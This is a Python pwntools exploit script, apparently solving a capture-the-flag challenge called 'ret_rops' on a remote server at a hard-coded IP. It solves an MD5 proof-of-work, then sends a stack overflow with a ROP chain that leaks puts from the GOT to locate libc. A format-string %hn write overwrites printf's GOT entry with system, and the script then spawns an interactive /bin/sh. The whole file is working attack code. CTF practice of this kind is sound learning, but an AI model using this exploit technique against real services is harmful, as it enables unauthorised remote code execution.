from pwn import *
import hashlib
import string
import random
from itertools import islice
elf = context.binary = ELF("./ret_rops")
context.log_level = logging.DEBUG
context.terminal = ["tmux", "splitw", "-h"]
loc_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def random_char(size):
	selection = iter(lambda: random.choice("abcdefghijklmnopqrtuvwxyz"),object())
	yield ''.join(islice(selection, size))

def encrypt(random_gen):
	return hashlib.md5(random_gen.encode("ascii"))

def proof_of_work(p):
	p.recvuntil("= ")
	md5 = str(p.recv(6))[2:-1]
	while True:
		random_gen = [x for x in random_char(4)][0]
		value = encrypt(random_gen).hexdigest()[-6:]

		if md5 == value:
			break
	print("PoW is: ",random_gen)
	p.sendline(random_gen)
def do_remote():
	p = remote("161.97.176.150", 2222)
	proof_of_work(p)
	return p
def do_debug():
	return gdb.debug(elf.path, gdbscript = """
												break main
												b*0x4011fd
												b*0x4011f2
""")

def do_local():
	return process(elf.path)

p = do_remote()
p.recvuntil("?")
pop_rdi = 0x401263
ret = 0x40101a
payload = 40*b"A" +  p64(pop_rdi) + p64(elf.sym.got["puts"]) + p64(elf.sym.plt["puts"]) +\
p64(elf.sym.main)
p.sendline(payload)
p.recvuntil("\x12\x40")
leak = p.recv(6).ljust(8,b"\x00")
print(leak)
puts_leak = u64(leak)
libc_base = puts_leak - 0x0875a0
loc_libc.address = puts_leak - loc_libc.sym.puts
system = libc_base + 0x055410
log.info("puts at %x:"%puts_leak)
log.info("libc at %x:"%libc_base)
log.info("system at %x"%system)
system_leak = "%x"%system
#system_leak = "%x"%loc_libc.sym.system
print(system_leak)
input("check leaks...")
first_write = ("%5d" % int(system_leak[:4],16)).encode("ascii")
print(first_write)
#third1 = int(system_leak[:4],16)
third2 = int(system_leak[4:8], 16)
third3 = int(system_leak[8:12],16)
print (third3, third2) # third3)
l = [third3, third2]
l.sort()
payload = b"%" + ("%05d"%l[0]).encode("ascii") + b"d%13$hn" +\
b"%" + ("%05d"%(l[1]-l[0])).encode("ascii") + b"d%14$hn"
payload += (0x28-len(payload))*b"A" + p64(ret) + p64(elf.sym.main)
for i in range(0,2):
#	if l[i] == third1:
#		payload += p64(elf.sym.got["printf"]+4)
	if l[i] == third2:
		payload += p64(elf.sym.got["printf"]+2)
	if l[i] == third3:
		payload += p64(elf.sym.got["printf"])
print(len(payload))
print(payload)
p.sendline(payload)
p.sendlineafter("?", "/bin/sh")
p.interactive()
